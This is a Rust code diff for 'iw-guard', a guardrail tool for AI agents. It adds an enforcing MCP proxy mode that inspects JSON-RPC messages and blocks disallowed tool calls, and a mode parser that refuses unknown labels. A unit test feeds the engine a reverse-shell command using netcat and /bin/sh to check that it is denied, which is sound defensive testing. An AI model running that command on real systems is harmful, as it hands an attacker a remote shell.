@@ -10,7 +10,11 @@
 //! (eBPF/sensor/exec-gate) stays Linux-only; this is the portable guardrail half.
 
 use std::io::Read;
+use std::sync::Arc;
 
+use innerwarden_agent_guard::mcp_proxy::enforce::ProxyMode;
+use innerwarden_agent_guard::mcp_proxy::router::ProxyDecision;
+use innerwarden_agent_guard::mcp_proxy::transport::{run_proxy, ProxyConfig};
 use innerwarden_agent_guard::{mcp::analyze_command, rules::RuleEngine};
 
 const DEFAULT_BIND: &str = "127.0.0.1:8787";
@@ -20,6 +24,7 @@ fn main() -> std::process::ExitCode {
     match args.first().map(String::as_str) {
         Some("check") => cmd_check(&args[1..]),
         Some("serve") => cmd_serve(&args[1..]),
+        Some("proxy") => cmd_proxy(&args[1..]),
         Some("--version") | Some("-V") => {
             println!("iw-guard {}", env!("CARGO_PKG_VERSION"));
             std::process::ExitCode::SUCCESS
@@ -159,6 +164,114 @@ fn cmd_serve(rest: &[String]) -> std::process::ExitCode {
     std::process::ExitCode::SUCCESS
 }
 
+/// Map a `--mode` label to a [`ProxyMode`]. Returns `None` for an unknown label
+/// so the CLI can ERROR instead of silently downgrading a typo to advisory (the
+/// fail-open fallback in `ProxyMode::from_label`), which would leave enforcement
+/// off without the operator noticing.
+fn parse_proxy_mode(label: &str) -> Option<ProxyMode> {
+    match label {
+        "advisory" | "warn" | "guard" | "kill" => Some(ProxyMode::from_label(label)),
+        _ => None,
+    }
+}
+
+/// One stderr line per inspected message (stdout is reserved for the wrapped
+/// server's MCP bytes).
+fn format_alert(label: &str, d: &ProxyDecision) -> String {
+    let rules: Vec<&str> = d.verdict.alerts.iter().map(|a| a.rule.as_str()).collect();
+    format!(
+        "[iw-guard] label={label} {} method={:?} tool={:?} allowed={} rules={rules:?}",
+        d.direction, d.method, d.tool_name, d.verdict.allowed
+    )
+}
+
+/// The ENFORCING guardrail: `iw-guard proxy [--mode M] [--label L]
+/// [--error-response] -- <server> [args]`. A stdio man-in-the-middle that wraps
+/// an MCP server and inspects every JSON-RPC message; in `guard`/`kill` mode it
+/// blocks a disallowed `tools/call` inline (not just advisory like
+/// `check`/`serve`). stdout stays pure MCP bytes; the banner and alerts go to
+/// stderr.
+fn cmd_proxy(rest: &[String]) -> std::process::ExitCode {
+    let mut mode_label = String::from("guard");
+    let mut label = String::from("iw-guard");
+    let mut error_response = false;
+    let mut server_cmd: Vec<String> = Vec::new();
+
+    let mut it = rest.iter();
+    while let Some(a) = it.next() {
+        match a.as_str() {
+            "--mode" => {
+                if let Some(v) = it.next() {
+                    mode_label = v.clone();
+                }
+            }
+            "--label" => {
+                if let Some(v) = it.next() {
+                    label = v.clone();
+                }
+            }
+            "--error-response" => error_response = true,
+            "--help" | "-h" => {
+                print_help();
+                return std::process::ExitCode::SUCCESS;
+            }
+            "--" => {
+                server_cmd = it.cloned().collect();
+                break;
+            }
+            other => {
+                eprintln!(
+                    "iw-guard proxy: unexpected argument `{other}` \
+                     (put the server command after `--`)"
+                );
+                return std::process::ExitCode::from(2);
+            }
+        }
+    }
+
+    let Some(mode) = parse_proxy_mode(&mode_label) else {
+        eprintln!("iw-guard proxy: unknown --mode `{mode_label}` (use advisory|warn|guard|kill)");
+        return std::process::ExitCode::from(2);
+    };
+    if server_cmd.is_empty() {
+        eprintln!(
+            "iw-guard proxy: no server command \
+             (usage: iw-guard proxy [--mode M] -- <server> [args...])"
+        );
+        return std::process::ExitCode::from(2);
+    }
+
+    let engine = Arc::new(RuleEngine::load_embedded());
+    eprintln!(
+        "iw-guard: proxy mode={mode_label} label={label} rules={} server={server_cmd:?}",
+        engine.rule_count()
+    );
+    let cfg = ProxyConfig {
+        server_cmd,
+        mode,
+        as_protocol_error: error_response,
+    };
+
+    let rt = match tokio::runtime::Builder::new_multi_thread()
+        .enable_all()
+        .build()
+    {
+        Ok(rt) => rt,
+        Err(e) => {
+            eprintln!("iw-guard proxy: failed to start runtime: {e}");
+            return std::process::ExitCode::from(1);
+        }
+    };
+    let on_alert = move |d: &ProxyDecision| eprintln!("{}", format_alert(&label, d));
+    match rt.block_on(run_proxy(cfg, Some(engine), on_alert)) {
+        Ok(code) => std::process::ExitCode::from(code.clamp(0, 255) as u8),
+        Err(e) => {
+            eprintln!("iw-guard proxy: {e}");
+            std::process::ExitCode::from(1)
+        }
+    }
+}
+
 fn print_help() {
     println!(
         "iw-guard {ver} - InnerWarden AI-agent guardrail (cross-platform: Linux, macOS, Windows)\n\
@@ -169,11 +282,14 @@ fn print_help() {
            iw-guard check \"<command>\"       analyze a command, print the verdict as JSON\n  \
            echo \"<command>\" | iw-guard check\n  \
            iw-guard serve [--bind IP:PORT]   serve POST /api/agent/check-command (plain HTTP, loopback)\n  \
+           iw-guard proxy [--mode M] -- <server> [args]\n  \
+           \x20                                enforcing MCP guard: wrap a server, block bad tool calls\n  \
            iw-guard --version\n\
          \n\
          `check` exits 1 when the verdict is `deny`, so a PreToolUse hook can gate:\n  \
            iw-guard check \"$CMD\" || echo blocked\n\
          \n\
+         proxy --mode: advisory | warn | guard (default) | kill\n\
          Default serve bind: {bind}",
         ver = env!("CARGO_PKG_VERSION"),
         bind = DEFAULT_BIND,
@@ -217,6 +333,18 @@ mod tests {
     fn reverse_shell_denies() {
         let engine = RuleEngine::load_embedded();
         assert!(is_deny(&analyze("nc -e /bin/sh 1.2.3.4 4444", &engine)));
+    }
+
+    #[test]
+    fn parse_proxy_mode_maps_known_and_rejects_unknown() {
+        assert_eq!(parse_proxy_mode("advisory"), Some(ProxyMode::Advisory));
+        assert_eq!(parse_proxy_mode("warn"), Some(ProxyMode::Warn));
+        assert_eq!(parse_proxy_mode("guard"), Some(ProxyMode::Guard));
+        assert_eq!(parse_proxy_mode("kill"), Some(ProxyMode::Kill));
+        // Unknown does NOT silently downgrade to advisory - it must be rejected
+        // so enforcement is never turned off by a typo.
+        assert_eq!(parse_proxy_mode("bogus"), None);
+        assert_eq!(parse_proxy_mode(""), None);
     }
 
     #[test]
